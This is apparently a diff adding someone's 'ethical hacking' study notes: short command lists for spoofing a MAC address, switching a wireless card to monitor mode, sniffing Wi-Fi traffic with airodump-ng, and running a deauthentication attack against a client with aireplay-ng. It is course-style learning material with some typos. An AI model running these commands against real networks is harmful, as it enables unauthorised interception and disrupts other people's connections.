@@ -1,0 +1,51 @@
+ethical hacking:
+.........................
+
+changin mac address:
+>ifconfig //ether=mac address
+>ifconfig  wlan0(interface) down 
+>ifconfig wlan0 hw ether 00:11:22:33:44:55(new mac)
+>ifconfig wlan0 up
+.................................................................
+wireless modes:
+>iwconfig 
+>ifconfig wlan0 down
+>airmon-ng ckeck kill
+>iwconfig wlan0 mode monitor
+>ifconfig wlan0 up
+................................................................
+packet sniffing using Airodump:
+>iwconfig
+>airodump-ng mon0(monitor name)
+>ctrl+c //to quit any running program
+..................................................................
+wifi bands:
+2.4gh 5gh
+>airodump-ng --band abg mon0
+.............................................................
+targeted packet sniffng:
+>airodump-ng --bssid fb.....(id) --channel 2 --write test mon0
+>ls 
+>wireshark
+...............................................................
+deauthentication attack:
+>aireplay-ng --deauth 1000000000000 -a fb:13(bassid) -c 80:00:(client mac) mon0
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
